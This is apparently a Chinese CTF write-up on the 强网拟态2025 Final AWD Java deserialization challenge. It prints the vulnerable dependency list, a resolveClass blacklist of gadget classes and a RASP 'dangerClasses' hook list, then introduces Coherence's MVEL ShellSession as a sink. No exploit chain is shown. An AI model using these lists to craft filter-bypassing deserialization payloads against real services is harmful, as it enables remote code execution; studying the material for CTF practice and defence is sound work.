@@ -1,0 +1,840 @@
++++
+date = '2025-12-11T11:00:00+08:00'
+title = '强网拟态2025Final-awd_rasp复现'
+categories = ["Writeup"]
+tags = ["writeup", "ctf", "Web"]
+
++++
+
+
+
+这是一个含有非常多危险依赖的题，如下：
+
+```xml
+ <dependencies>
+
+        <!-- AOP / Aspect -->
+        <dependency>
+            <groupId>org.glassfish.hk2.external</groupId>
+            <artifactId>aopalliance-repackaged</artifactId>
+            <version>2.6.1</version>
+        </dependency>
+
+        <dependency>
+            <groupId>org.aspectj</groupId>
+            <artifactId>aspectjweaver</artifactId>
+            <version>1.9.2</version>
+        </dependency>
+
+        <!-- Oracle Coherence -->
+        <dependency>
+            <groupId>com.oracle.coherence.ce</groupId>
+            <artifactId>coherence</artifactId>
+            <version>14.1.1-0-3</version>
+        </dependency>
+
+        <dependency>
+            <groupId>com.oracle.coherence.ce</groupId>
+            <artifactId>coherence-rest</artifactId>
+            <version>14.1.1-0-3</version>
+        </dependency>
+
+        <!-- Commons -->
+        <dependency>
+            <groupId>commons-beanutils</groupId>
+            <artifactId>commons-beanutils</artifactId>
+            <version>1.9.2</version>
+        </dependency>
+
+        <dependency>
+            <groupId>commons-collections</groupId>
+            <artifactId>commons-collections</artifactId>
+            <version>3.2.1</version>
+        </dependency>
+
+        <dependency>
+            <groupId>org.apache.commons</groupId>
+            <artifactId>commons-collections4</artifactId>
+            <version>4.0</version>
+        </dependency>
+
+        <dependency>
+            <groupId>commons-logging</groupId>
+            <artifactId>commons-logging</artifactId>
+            <version>1.2</version>
+        </dependency>
+
+        <!-- Groovy -->
+        <dependency>
+            <groupId>org.codehaus.groovy</groupId>
+            <artifactId>groovy</artifactId>
+            <version>2.3.9</version>
+        </dependency>
+
+        <!-- HK2 -->
+        <dependency>
+            <groupId>org.glassfish.hk2</groupId>
+            <artifactId>hk2-api</artifactId>
+            <version>2.6.1</version>
+        </dependency>
+
+        <dependency>
+            <groupId>org.glassfish.hk2</groupId>
+            <artifactId>hk2-locator</artifactId>
+            <version>2.6.1</version>
+        </dependency>
+
+        <dependency>
+            <groupId>org.glassfish.hk2</groupId>
+            <artifactId>hk2-utils</artifactId>
+            <version>2.6.1</version>
+        </dependency>
+
+        <!-- Jackson -->
+        <dependency>
+            <groupId>com.fasterxml.jackson.core</groupId>
+            <artifactId>jackson-annotations</artifactId>
+            <version>2.13.4</version>
+        </dependency>
+
+        <dependency>
+            <groupId>com.fasterxml.jackson.core</groupId>
+            <artifactId>jackson-core</artifactId>
+            <version>2.13.4</version>
+        </dependency>
+
+        <dependency>
+            <groupId>com.fasterxml.jackson.core</groupId>
+            <artifactId>jackson-databind</artifactId>
+            <version>2.13.4.2</version>
+        </dependency>
+
+        <dependency>
+            <groupId>com.fasterxml.jackson.datatype</groupId>
+            <artifactId>jackson-datatype-jdk8</artifactId>
+            <version>2.13.4</version>
+        </dependency>
+
+        <dependency>
+            <groupId>com.fasterxml.jackson.datatype</groupId>
+            <artifactId>jackson-datatype-jsr310</artifactId>
+            <version>2.13.4</version>
+        </dependency>
+
+        <dependency>
+            <groupId>com.fasterxml.jackson.jaxrs</groupId>
+            <artifactId>jackson-jaxrs-base</artifactId>
+            <version>2.13.4</version>
+        </dependency>
+
+        <dependency>
+            <groupId>com.fasterxml.jackson.jaxrs</groupId>
+            <artifactId>jackson-jaxrs-json-provider</artifactId>
+            <version>2.13.4</version>
+        </dependency>
+
+        <dependency>
+            <groupId>com.fasterxml.jackson.module</groupId>
+            <artifactId>jackson-module-jaxb-annotations</artifactId>
+            <version>2.13.4</version>
+        </dependency>
+
+        <dependency>
+            <groupId>com.fasterxml.jackson.module</groupId>
+            <artifactId>jackson-module-parameter-names</artifactId>
+            <version>2.13.4</version>
+        </dependency>
+
+        <!-- Jakarta -->
+        <dependency>
+            <groupId>jakarta.activation</groupId>
+            <artifactId>jakarta.activation-api</artifactId>
+            <version>1.2.2</version>
+        </dependency>
+
+        <dependency>
+            <groupId>jakarta.annotation</groupId>
+            <artifactId>jakarta.annotation-api</artifactId>
+            <version>1.3.5</version>
+        </dependency>
+
+        <dependency>
+            <groupId>jakarta.validation</groupId>
+            <artifactId>jakarta.validation-api</artifactId>
+            <version>2.0.2</version>
+        </dependency>
+
+        <dependency>
+            <groupId>jakarta.ws.rs</groupId>
+            <artifactId>jakarta.ws.rs-api</artifactId>
+            <version>2.1.6</version>
+        </dependency>
+
+        <dependency>
+            <groupId>jakarta.xml.bind</groupId>
+            <artifactId>jakarta.xml.bind-api</artifactId>
+            <version>2.3.3</version>
+        </dependency>
+
+        <!-- Javassist -->
+        <dependency>
+            <groupId>org.javassist</groupId>
+            <artifactId>javassist</artifactId>
+            <version>3.25.0-GA</version>
+        </dependency>
+
+        <!-- Jersey -->
+        <dependency>
+            <groupId>org.glassfish.jersey.core</groupId>
+            <artifactId>jersey-client</artifactId>
+            <version>2.35</version>
+        </dependency>
+
+        <dependency>
+            <groupId>org.glassfish.jersey.core</groupId>
+            <artifactId>jersey-common</artifactId>
+            <version>2.35</version>
+        </dependency>
+
+        <dependency>
+            <groupId>org.glassfish.jersey.containers</groupId>
+            <artifactId>jersey-container-jdk-http</artifactId>
+            <version>2.35</version>
+        </dependency>
+
+        <dependency>
+            <groupId>org.glassfish.jersey.containers</groupId>
+            <artifactId>jersey-container-servlet</artifactId>
+            <version>2.35</version>
+        </dependency>
+
+        <dependency>
+            <groupId>org.glassfish.jersey.containers</groupId>
+            <artifactId>jersey-container-servlet-core</artifactId>
+            <version>2.35</version>
+        </dependency>
+
+        <dependency>
+            <groupId>org.glassfish.jersey.ext</groupId>
+            <artifactId>jersey-entity-filtering</artifactId>
+            <version>2.35</version>
+        </dependency>
+
+        <dependency>
+            <groupId>org.glassfish.jersey.inject</groupId>
+            <artifactId>jersey-hk2</artifactId>
+            <version>2.35</version>
+        </dependency>
+
+        <dependency>
+            <groupId>org.glassfish.jersey.media</groupId>
+            <artifactId>jersey-media-json-jackson</artifactId>
+            <version>2.35</version>
+        </dependency>
+
+        <dependency>
+            <groupId>org.glassfish.jersey.media</groupId>
+            <artifactId>jersey-media-sse</artifactId>
+            <version>2.35</version>
+        </dependency>
+
+        <dependency>
+            <groupId>org.glassfish.jersey.core</groupId>
+            <artifactId>jersey-server</artifactId>
+            <version>2.35</version>
+        </dependency>
+
+        <!-- JTA -->
+        <dependency>
+            <groupId>javax.transaction</groupId>
+            <artifactId>jta</artifactId>
+            <version>1.1</version>
+        </dependency>
+
+        <!-- Logging -->
+        <dependency>
+            <groupId>org.slf4j</groupId>
+            <artifactId>jul-to-slf4j</artifactId>
+            <version>1.7.36</version>
+        </dependency>
+
+        <dependency>
+            <groupId>org.slf4j</groupId>
+            <artifactId>slf4j-api</artifactId>
+            <version>1.7.36</version>
+        </dependency>
+
+        <dependency>
+            <groupId>org.apache.logging.log4j</groupId>
+            <artifactId>log4j-api</artifactId>
+            <version>2.17.2</version>
+        </dependency>
+
+        <dependency>
+            <groupId>org.apache.logging.log4j</groupId>
+            <artifactId>log4j-to-slf4j</artifactId>
+            <version>2.17.2</version>
+        </dependency>
+
+        <dependency>
+            <groupId>ch.qos.logback</groupId>
+            <artifactId>logback-classic</artifactId>
+            <version>1.2.11</version>
+        </dependency>
+
+        <dependency>
+            <groupId>ch.qos.logback</groupId>
+            <artifactId>logback-core</artifactId>
+            <version>1.2.11</version>
+        </dependency>
+
+        <!-- OSGI -->
+        <dependency>
+            <groupId>org.glassfish.hk2</groupId>
+            <artifactId>osgi-resource-locator</artifactId>
+            <version>1.0.3</version>
+        </dependency>
+
+        <!-- SnakeYAML -->
+        <dependency>
+            <groupId>org.yaml</groupId>
+            <artifactId>snakeyaml</artifactId>
+            <version>1.29</version>
+        </dependency>
+
+        <!-- Spring Framework -->
+        <dependency>
+            <groupId>org.springframework</groupId>
+            <artifactId>spring-aop</artifactId>
+            <version>5.3.23</version>
+        </dependency>
+
+        <dependency>
+            <groupId>org.springframework</groupId>
+            <artifactId>spring-beans</artifactId>
+            <version>5.3.23</version>
+        </dependency>
+
+        <dependency>
+            <groupId>org.springframework</groupId>
+            <artifactId>spring-context</artifactId>
+            <version>5.3.23</version>
+        </dependency>
+
+        <dependency>
+            <groupId>org.springframework</groupId>
+            <artifactId>spring-core</artifactId>
+            <version>5.3.23</version>
+        </dependency>
+
+        <dependency>
+            <groupId>org.springframework</groupId>
+            <artifactId>spring-expression</artifactId>
+            <version>5.3.23</version>
+        </dependency>
+
+        <dependency>
+            <groupId>org.springframework</groupId>
+            <artifactId>spring-jcl</artifactId>
+            <version>5.3.23</version>
+        </dependency>
+
+        <dependency>
+            <groupId>org.springframework</groupId>
+            <artifactId>spring-web</artifactId>
+            <version>5.3.23</version>
+        </dependency>
+
+        <dependency>
+            <groupId>org.springframework</groupId>
+            <artifactId>spring-webmvc</artifactId>
+            <version>5.3.23</version>
+        </dependency>
+
+        <dependency>
+            <groupId>org.springframework</groupId>
+            <artifactId>spring-tx</artifactId>
+            <version>5.3.30</version>
+        </dependency>
+
+        <!-- Spring Boot -->
+        <dependency>
+            <groupId>org.springframework.boot</groupId>
+            <artifactId>spring-boot</artifactId>
+            <version>2.6.13</version>
+        </dependency>
+
+        <dependency>
+            <groupId>org.springframework.boot</groupId>
+            <artifactId>spring-boot-autoconfigure</artifactId>
+            <version>2.6.13</version>
+        </dependency>
+
+        <dependency>
+            <groupId>org.springframework.boot</groupId>
+            <artifactId>spring-boot-jarmode-layertools</artifactId>
+            <version>2.6.13</version>
+        </dependency>
+
+        <!-- Tomcat -->
+        <dependency>
+            <groupId>org.apache.tomcat.embed</groupId>
+            <artifactId>tomcat-embed-core</artifactId>
+            <version>9.0.68</version>
+        </dependency>
+
+        <dependency>
+            <groupId>org.apache.tomcat.embed</groupId>
+            <artifactId>tomcat-embed-el</artifactId>
+            <version>9.0.68</version>
+        </dependency>
+
+        <dependency>
+            <groupId>org.apache.tomcat.embed</groupId>
+            <artifactId>tomcat-embed-websocket</artifactId>
+            <version>9.0.68</version>
+        </dependency>
+
+```
+
+相对的waf也非常长，分别是在resolveClass中的Waf和在Rasp中的waf
+
+```Java
+import java.io.IOException;
+import java.io.InputStream;
+import java.io.InvalidClassException;
+import java.io.ObjectInputStream;
+import java.io.ObjectStreamClass;
+
+/* loaded from: AwdBypass-0.0.1-SNAPSHOT.jar:BOOT-INF/classes/org/awd/awdbypass/serialization/SecurityObjectInputStream.class */
+public class SecurityObjectInputStream extends ObjectInputStream {
+    public static String[] blacklist = {"br.com.anteros.dbcp.AnterosDBCPConfig", "br.com.anteros.dbcp.AnterosDBCPDataSource", "bsh.Interpreter", "bsh.XThis", "ch.qos.logback.core.db.DriverManagerConnectionSource", "ch.qos.logback.core.db.JNDIConnectionSource", "clojure.inspector.proxy$javax.swing.table.AbstractTableModel$ff19274a", "clojure.lang.PersistentArrayMap", "com.alibaba.fastjson.JSONArray", "com.alibaba.fastjson.TypeReference", "com.alibaba.fastjson2.JSONArray", "com.caucho.config.types.ResourceRef", "com.fasterxml.jackson.databind.node.POJONode", "com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig", "com.mchange.v2.c3p0.ComboPooledDataSource", "com.mchange.v2.c3p0.JndiRefForwardingDataSource", "com.mchange.v2.c3p0.PoolBackedDataSource", "com.mchange.v2.c3p0.debug.AfterCloseLoggingComboPooledDataSource", "com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase", "com.mysql.cj.jdbc.MysqlConnectionPoolDataSource", "com.mysql.cj.jdbc.MysqlXADataSource", "com.mysql.cj.jdbc.admin.MiniAdmin", "com.newrelic.agent.deps.ch.qos.logback.core.db.DriverManagerConnectionSource", "com.newrelic.agent.deps.ch.qos.logback.core.db.JNDIConnectionSource", "com.nqadmin.rowset.JdbcRowSetImpl", "com.oracle.wls.shaded.org.apache.xalan.lib.sql.JNDIConnectionPool", "com.p6spy.engine.spy.P6DataSource", "com.pastdev.httpcomponents.configuration.JndiConfiguration", "com.sun.deploy.security.ruleset.DRSHelper", "com.sun.jmx.interceptor.DefaultMBeanServerInterceptor", "com.sun.jmx.mbeanserver.JmxMBeanServer", "com.sun.jmx.mbeanserver.NamedObject", "com.sun.jmx.mbeanserver.Repository", "com.sun.org.apache.bcel.internal.util.ClassLoader", "com.sun.org.apache.xalan.internal.lib.sql.JNDIConnectionPool", "com.sun.org.apache.xalan.internal.xslt.ObjectFactory", "com.sun.org.apache.xalan.internal.xslt.Process", "com.sun.org.apache.xalan.internal.xsltc.DOM", "com.sun.org.apache.xalan.internal.xsltc.TransletException", "com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet", "com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl", "com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl", "com.sun.org.apache.xml.internal.dtm.DTMAxisIterator", "com.sun.org.apache.xml.internal.serializer.SerializationHandler", "com.sun.rowset.JdbcRowSetImpl", "com.sun.syndication.feed.impl.ObjectBean", "com.vaadin.data.Property", "com.vaadin.data.util.NestedMethodProperty", "com.vaadin.data.util.PropertysetItem", "com.zaxxer.hikari.HikariConfig", "com.zaxxer.hikari.HikariDataSource", "flex.messaging.util.concurrent.AsynchBeansWorkManagerExecutor", "groovy.lang.Closure", "jodd.db.connection.DataSourceConnectionProvider", "net.sf.ehcache.hibernate.EhcacheJtaTransactionManagerLookup", "net.sf.ehcache.transaction.manager.DefaultTransactionManagerLookup", "net.sf.ehcache.transaction.manager.selector.GenericJndiSelector", "net.sf.ehcache.transaction.manager.selector.GlassfishSelector", "net.sf.json.JSONObject", "oadd.org.apache.commons.dbcp.cpdsadapter.DriverAdapterCPDS", "oadd.org.apache.commons.dbcp.datasources.PerUserPoolDataSource", "oadd.org.apache.commons.dbcp.datasources.SharedPoolDataSource", "oadd.org.apache.xalan.lib.sql.JNDIConnectionPool", "om.mchange.v2.c3p0.WrapperConnectionPoolDataSource", "om.sun.corba.se.spi.orbutil.proxy.CompositeInvocationHandlerImpl", "oracle.jdbc.connector.OracleManagedConnectionFactory", "oracle.jdbc.pool.OraclePooledConnection", "oracle.jdbc.rowset.OracleJDBCRowSet", "oracle.jms.AQjmsQueueConnectionFactory", "oracle.jms.AQjmsTopicConnectionFactory", "oracle.jms.AQjmsXAConnectionFactory", "oracle.jms.AQjmsXAQueueConnectionFactory", "oracle.jms.AQjmsXATopicConnectionFactory", "org..springframework.transaction.jta.JtaTransactionManager", "org.aoju.bus.proxy.provider.RmiProvider", "org.aoju.bus.proxy.provider.remoting.RmiProvider", "org.apache.activemq.ActiveMQConnectionFactory", "org.apache.activemq.ActiveMQXAConnectionFactory", "org.apache.activemq.jms.pool.JcaPooledConnectionFactory", "org.apache.activemq.jms.pool.XaPooledConnectionFactory", "org.apache.activemq.pool.JcaPooledConnectionFactory", "org.apache.activemq.pool.PooledConnectionFactory", "org.apache.activemq.pool.XaPooledConnectionFactory", "org.apache.activemq.spring.ActiveMQConnectionFactory", "org.apache.activemq.spring.ActiveMQXAConnectionFactory", "org.apache.aries.transaction.jms.RecoverablePooledConnectionFactory", "org.apache.aries.transaction.jms.internal.XaPooledConnectionFactory", "org.apache.axis2.jaxws.spi.handler.HandlerResolverImpl", "org.apache.axis2.transport.jms.JMSOutTransportInfo", "org.apache.bcel.internal.util.ClassLoader", "org.apache.catalina.authenticator.AuthenticatorBase", "org.apache.catalina.connector.Request", "org.apache.catalina.connector.RequestFacade", "org.apache.catalina.connector.Response", "org.apache.catalina.core.ApplicationFilterConfig", "org.apache.catalina.core.ApplicationServletRegistration", "org.apache.catalina.core.StandardContext", "org.apache.catalina.core.StandardService", "org.apache.catalina.core.StandardWrapperValue.invoke", "org.apache.catalina.deploy.FilterDef", "org.apache.catalina.deploy.FilterMap", "org.apache.catalina.loader.ParallelWebappClassLoader", "org.apache.catalina.loader.WebappClassLoaderBase", "org.apache.click.control.Column", "org.apache.click.control.Column$ColumnComparator", "org.apache.click.control.Table", "org.apache.commons.beanutils.BeanComparator", "org.apache.commons.codec.binary.Base64", "org.apache.commons.collections.Transformer", "org.apache.commons.collections.comparators.TransformingComparator", "org.apache.commons.collections.functors.ChainedTransformer", "org.apache.commons.collections.functors.ConstantTransformer", "org.apache.commons.collections.functors.InstantiateTransformer", "org.apache.commons.collections.functors.InvokerTransformer", "org.apache.commons.collections.functors.MapTransformer", "org.apache.commons.collections.keyvalue.TiedMapEntry", "org.apache.commons.collections.map.LazyMap", "org.apache.commons.collections.map.TransformedMap", "org.apache.commons.collections4.Transformer", "org.apache.commons.collections4.comparators.TransformingComparator", "org.apache.commons.collections4.functors.ChainedTransformer", "org.apache.commons.collections4.functors.ConstantTransformer", "org.apache.commons.collections4.functors.InstantiateTransformer", "org.apache.commons.collections4.functors.InvokerTransformer", "org.apache.commons.collections4.functors.MapTransformer", "org.apache.commons.collections4.keyvalue.TiedMapEntry", "org.apache.commons.collections4.map.LazyMap", "org.apache.commons.collections4.map.TransformedMap", "org.apache.commons.configuration.JNDIConfiguration", "org.apache.commons.configuration2.JNDIConfiguration", "org.apache.commons.dbcp.cpdsadapter.DriverAdapterCPDS", "org.apache.commons.dbcp.datasources.PerUserPoolDataSource", "org.apache.commons.dbcp.datasources.SharedPoolDataSource", "org.apache.commons.dbcp2.cpdsadapter.DriverAdapterCPDS", "org.apache.commons.dbcp2.datasources.PerUserPoolDataSource", "org.apache.commons.dbcp2.datasources.SharedPoolDataSource", "org.apache.commons.fileupload.disk.DiskFileItem", "org.apache.commons.io.FileUtils", "org.apache.commons.io.output.DeferredFileOutputStream", "org.apache.commons.io.output.ThresholdingOutputStream", "org.apache.commons.jelly.impl.Embedded", "org.apache.commons.proxy.provider.remoting.RmiProvider", "org.apache.coyote.AbstractProtocol;", "org.apache.coyote.ProtocolHandler", "org.apache.coyote.Request", "org.apache.coyote.Response", "org.apache.cxf.jaxrs.provider.XSLTJaxbProvider", "org.apache.hadoop.shaded.com.zaxxer.hikari.HikariConfig", "org.apache.ibatis.datasource.jndi.JndiDataSourceFactory", "org.apache.ibatis.parsing.XPathParser", "org.apache.ignite.cache.jta.jndi.CacheJndiTmFactory", "org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup", "org.apache.log4j.receivers.db.DriverManagerConnectionSource", "org.apache.log4j.receivers.db.JNDIConnectionSource", "org.apache.myfaces.context.servlet.FacesContextImpl", "org.apache.myfaces.context.servlet.FacesContextImplBase", "org.apache.myfaces.el.CompositeELResolver", "org.apache.myfaces.el.unified.FacesELContext", "org.apache.myfaces.view.facelets.el.ValueExpressionMethodExpression", "org.apache.openjpa.ee.JNDIManagedRuntime", "org.apache.openjpa.ee.RegistryManagedRuntime", "org.apache.openjpa.ee.WASRegistryManagedRuntime", "org.apache.shiro.codec.Base64", "org.apache.shiro.codec.CodecSupport", "org.apache.shiro.crypto.AesCipherService", "org.apache.shiro.io.DefaultSerializer", "org.apache.shiro.jndi.JndiObjectFactory", "org.apache.shiro.realm.jndi.JndiRealmFactory", "org.apache.shiro.util.ByteSource", "org.apache.tomcat.dbcp.dbcp.cpdsadapter.DriverAdapterCPDS", "org.apache.tomcat.dbcp.dbcp.datasources.PerUserPoolDataSource", "org.apache.tomcat.dbcp.dbcp.datasources.SharedPoolDataSource", "org.apache.tomcat.dbcp.dbcp2.BasicDataSourc", "org.apache.tomcat.dbcp.dbcp2.cpdsadapter.DriverAdapterCPDS", "org.apache.tomcat.dbcp.dbcp2.datasources.PerUserPoolDataSource", "org.apache.tomcat.dbcp.dbcp2.datasources.SharedPoolDataSource", "org.apache.tomcat.util.buf.ByteChunk", "org.apache.tomcat.util.descriptor.web.FilterDef", "org.apache.tomcat.util.descriptor.web.FilterMap", "org.apache.tomcat.util.modeler.BaseModelMBean", "org.apache.tomcat.util.modeler.Registry", "org.apache.wicket.util.file.Files", "org.apache.wicket.util.io.DeferredFileOutputStream", "org.apache.wicket.util.io.ThresholdingOutputStream", "org.apache.wicket.util.upload.DiskFileItem", "org.apache.xalan.lib.sql.JNDIConnectionPool", "org.apache.xalan.xslt.ObjectFactory", "org.apache.xalan.xslt.Process", "org.apache.xalan.xsltc.DOM", "org.apache.xalan.xsltc.TransletException", "org.apache.xalan.xsltc.runtime.AbstractTranslet", "org.apache.xalan.xsltc.trax.TemplatesImpl", "org.apache.xalan.xsltc.trax.TransformerFactoryImpl", "org.apache.xbean.propertyeditor.JndiConverter", "org.apache.xml.dtm.DTMAxisIterator", "org.apache.xml.serializer.SerializationHandler", "org.arrah.framework.rdbms.UpdatableJdbcRowsetImpl", "org.aspectj.weaver.tools.cache.SimpleCache$StoreableCachingMap", "org.codehaus.groovy.runtime.ConvertedClosure", "org.codehaus.groovy.runtime.MethodClosure", "org.docx4j.org.apache.xalan.lib.sql.JNDIConnectionPool", "org.hibernate.EntityMode", "org.hibernate.engine.TypedValue", "org.hibernate.engine.spi.TypedValue", "org.hibernate.engine.spi.TypedValue$1", "org.hibernate.jmx.StatisticsService", "org.hibernate.property.BasicPropertyAccessor$BasicGetter", "org.hibernate.property.Getter", "org.hibernate.property.access.spi.Getter", "org.hibernate.property.access.spi.GetterMethodImpl", "org.hibernate.tuple.EntityModeToTuplizerMapping", "org.hibernate.tuple.component.AbstractComponentTuplizer", "org.hibernate.tuple.component.PojoComponentTuplizer", "org.hibernate.tuple.entity.EntityEntityModeToTuplizerMapping", "org.hibernate.type.AbstractType", "org.hibernate.type.ComponentType", "org.hibernate.type.Type", "org.jboss.interceptor.builder.InterceptionModelBuilder", "org.jboss.interceptor.builder.MethodReference", "org.jboss.interceptor.proxy.DefaultInvocationContextFactory", "org.jboss.interceptor.proxy.InterceptorMethodHandler", "org.jboss.interceptor.reader.ClassMetadataInterceptorReference", "org.jboss.interceptor.reader.DefaultMethodMetadata", "org.jboss.interceptor.reader.ReflectiveClassMetadata", "org.jboss.interceptor.reader.SimpleInterceptorMetadata", "org.jboss.interceptor.spi.context.InvocationContextFactory", "org.jboss.interceptor.spi.instance.InterceptorInstantiator", "org.jboss.interceptor.spi.metadata.ClassMetadata", "org.jboss.interceptor.spi.metadata.InterceptorReference", "org.jboss.interceptor.spi.metadata.MethodMetadata", "org.jboss.interceptor.spi.model.InterceptionModel", "org.jboss.interceptor.spi.model.InterceptionType", "org.jboss.remoting3.Channel", "org.jboss.remoting3.Connection", "org.jboss.remoting3.Endpoint", "org.jboss.remoting3.OpenListener", "org.jboss.remoting3.Remoting", "org.jboss.remoting3.remote.HttpUpgradeConnectionProviderFactory", "org.jboss.remoting3.spi.ConnectionHandler", "org.jboss.remoting3.spi.ConnectionHandlerContext", "org.jboss.remoting3.spi.ConnectionHandlerFactory", "org.jboss.util.propertyeditor.DocumentEditor", "org.jboss.weld.interceptor.builder.InterceptionModelBuilder", "org.jboss.weld.interceptor.builder.MethodReference", "org.jboss.weld.interceptor.proxy.DefaultInvocationContextFactory", "org.jboss.weld.interceptor.proxy.InterceptorMethodHandler", "org.jboss.weld.interceptor.reader.ClassMetadataInterceptorReference", "org.jboss.weld.interceptor.reader.DefaultMethodMetadata", "org.jboss.weld.interceptor.reader.ReflectiveClassMetadata", "org.jboss.weld.interceptor.reader.SimpleInterceptorMetadata", "org.jboss.weld.interceptor.spi.context.InvocationContextFactory", "org.jboss.weld.interceptor.spi.instance.InterceptorInstantiator", "org.jboss.weld.interceptor.spi.metadata.ClassMetadata", "org.jboss.weld.interceptor.spi.metadata.InterceptorReference", "org.jboss.weld.interceptor.spi.metadata.MethodMetadata", "org.jboss.weld.interceptor.spi.model.InterceptionModel", "org.jboss.weld.interceptor.spi.model.InterceptionType", "org.jdom.Document", "org.jdom.Element", "org.jdom.input.SAXBuilder", "org.jdom.transform.XSLTransformer", "org.jdom2.transform.XSLTransformer", "org.jsecurity.realm.jndi.JndiRealmFactory", "org.mozilla.javascript.**", "org.mozilla.javascript.Callable", "org.mozilla.javascript.ClassCache", "org.mozilla.javascript.Context", "org.mozilla.javascript.IdScriptableObject", "org.mozilla.javascript.MemberBox", "org.mozilla.javascript.NativeError", "org.mozilla.javascript.NativeJavaArray", "org.mozilla.javascript.NativeJavaMethod", "org.mozilla.javascript.NativeJavaObject", "org.mozilla.javascript.NativeObject", "org.mozilla.javascript.Scriptable", "org.mozilla.javascript.ScriptableObject", "org.mozilla.javascript.tools.shell.Environment", "org.python.core.PyBytecode", "org.python.core.PyFunction", "org.python.core.PyObject", "org.python.core.PyString", "org.python.core.PyStringMap", "org.quartz.utils.JNDIConnectionProvider", "org.reflections.Reflections", "org.slf4j.ext.EventData", "org.springframework.aop.TargetSource", "org.springframework.aop.config.MethodLocatingFactoryBean", "org.springframework.aop.framework.AdvisedSupport", "org.springframework.aop.framework.JdkDynamicAopProxy", "org.springframework.aop.support.AbstractBeanFactoryPointcutAdvisor", "org.springframework.aop.target.SingletonTargetSource", "org.springframework.beans.factory.ObjectFactory", "org.springframework.beans.factory.config.BeanReferenceFactoryBean", "org.springframework.beans.factory.config.PropertyPathFactoryBean", "org.springframework.beans.factory.support.AutowireUtils$ObjectFactoryDelegatingInvocationHandler", "org.springframework.core.SerializableTypeWrapper.$MethodInvokeTypeProvider", "org.springframework.web.servlet.handler.HandlerInterceptorAdapter", "org.springframework.web.servlet.mvc.annotation.DefaultAnnotationHandlerMapping", "org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping", "org.springframework.web.servlet.support.RequestContextUtils", "org.xnio.FutureResult", "org.xnio.IoFuture", "org.xnio.OptionMap", "org.xnio.Options", "org.xnio.Result", "org.xnio.Xnio", "org.xnio.XnioWorker", "org.xnio.ssl.JsseXnioSsl"};
+
+    public SecurityObjectInputStream(InputStream inputStream) throws IOException {
+        super(inputStream);
+    }
+
+    @Override // java.io.ObjectInputStream
+    protected Class resolveClass(ObjectStreamClass cls) throws IOException, ClassNotFoundException {
+        if (!contains(cls.getName())) {
+            return super.resolveClass(cls);
+        }
+        throw new InvalidClassException("Unexpected serialized class", cls.getName());
+    }
+
+    public static boolean contains(String targetValue) {
+        for (String forbiddenPackage : blacklist) {
+            if (targetValue.contains(forbiddenPackage)) {
+                return true;
+            }
+        }
+        return false;
+    }
+}
+```
+
+Hook.json
+
+```json
+"SerialHook": {
+    "doSerialHook": true,
+    "serialClassName": "org/apache/shiro/io/ClassResolvingObjectInputStream",
+    "dangerClasses": [
+      "org.springframework.transaction.support.AbstractPlatformTransactionManager",
+      "java.rmi.server.UnicastRemoteObject",
+      "java.rmi.server.RemoteObjectInvocationHandler",
+      "com.bea.core.repackaged.springframework.transaction.support.AbstractPlatformTransactionManager",
+      "java.rmi.server.RemoteObject",
+      "com.tangosol.coherence.rest.util.extractor.MvelExtractor",
+      "java.lang.Runtime",
+      "oracle.eclipselink.coherence.integrated.internal.cache.LockVersionExtractor",
+      "org.eclipse.persistence.internal.descriptors.MethodAttributeAccessor",
+      "org.eclipse.persistence.internal.descriptors.InstanceVariableAttributeAccessor",
+      "org.apache.commons.fileupload.disk.DiskFileItem",
+      "oracle.jdbc.pool.OraclePooledConnection",
+      "com.tangosol.util.extractor.ReflectionExtractor",
+      "com.tangosol.internal.util.SimpleBinaryEntry",
+      "com.tangosol.coherence.component.util.daemon.queueProcessor.service.grid.partitionedService.PartitionedCache$Storage$BinaryEntry",
+      "com.sun.rowset.JdbcRowSetImpl",
+      "org.eclipse.persistence.internal.indirection.ProxyIndirectionHandler",
+      "bsh.XThis",
+      "bsh.Interpreter",
+      "com.mchange.v2.c3p0.PoolBackedDataSource",
+      "com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase",
+      "org.apache.commons.beanutils.BeanComparator",
+      "java.lang.reflect.Proxy",
+      "clojure.lang.PersistentArrayMap",
+      "org.apache.commons.io.output.DeferredFileOutputStream",
+      "org.apache.commons.io.output.ThresholdingOutputStream",
+      "org.apache.wicket.util.upload.DiskFileItem",
+      "org.apache.wicket.util.io.DeferredFileOutputStream",
+      "org.apache.wicket.util.io.ThresholdingOutputStream",
+      "com.sun.org.apache.bcel.internal.util.ClassLoader",
+      "com.sun.syndication.feed.impl.ObjectBean",
+      "org.springframework.beans.factory.ObjectFactory",
+      "org.springframework.aop.framework.AdvisedSupport",
+      "org.springframework.aop.target.SingletonTargetSource",
+      "com.vaadin.data.util.NestedMethodProperty",
+      "com.vaadin.data.util.PropertysetItem",
+      "javax.management.BadAttributeValueExpException",
+      "org.apache.myfaces.context.servlet.FacesContextImpl",
+      "org.apache.myfaces.context.servlet.FacesContextImplBase",
+      "org.apache.commons.collections.functors.InvokerTransformer",
+      "org.apache.commons.collections.functors.InstantiateTransformer",
+      "org.apache.commons.collections4.functors.InvokerTransformer",
+      "org.apache.commons.collections4.functors.InstantiateTransformer",
+      "java.lang.ProcessBuilder",
+      "com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl",
+      "java.security.SignedObject",
+      "com.sun.jndi.ldap.LdapAttribute",
+      "javax.naming.InitialContext",
+      "org.springframework.aop.framework.JdkDynamicAopProxy",
+      "org.springframework.aop.aspectj",
+      "org.apache.xbean.naming.context",
+      "JSONArray",
+      "POJONode",
+      "ToStringBean",
+      "EqualsBean",
+      "ProxyLazyValue",
+      "SwingLazyValue",
+      "UIDefaults",
+      "XString",
+      "org.springframework.cache.interceptor.BeanFactoryCacheOperationSourceAdvisor",
+      "org.springframework.aop.aspectj.AspectInstanceFactory",
+      "org.slf4j",
+      "groovy",
+      "sun.print.UnixPrintService"
+    ]
+  }
+```
+
+
+
+### Sink: ShellSession 
+
+`ShellSession` 的主要作用是**提供一个命令行环境（类似于 Bash 或 Windows 的 cmd），让用户可以输入并执行 MVEL 表达式以及预定义的一些内部命令**，比如：ls、help之类的
+
+![image-20251202000037013](../assets/image-20251202000037013.png)
+
+![image-20251202000112390](../assets/image-20251202000112390.png)
